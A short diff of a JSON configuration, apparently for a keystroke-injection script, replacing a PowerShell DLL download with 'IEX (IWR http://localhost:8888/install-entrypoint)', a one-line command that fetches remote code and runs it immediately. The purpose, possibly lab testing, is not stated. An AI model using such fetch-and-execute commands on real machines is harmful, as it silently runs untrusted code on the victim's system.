@@ -15,7 +15,7 @@
             "type": "keystrokes",
             "value": {
                 "type": "script",
-                "value": "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll"
+                "value": "IEX (IWR http://localhost:8888/install-entrypoint)"
             }
         }
     ]
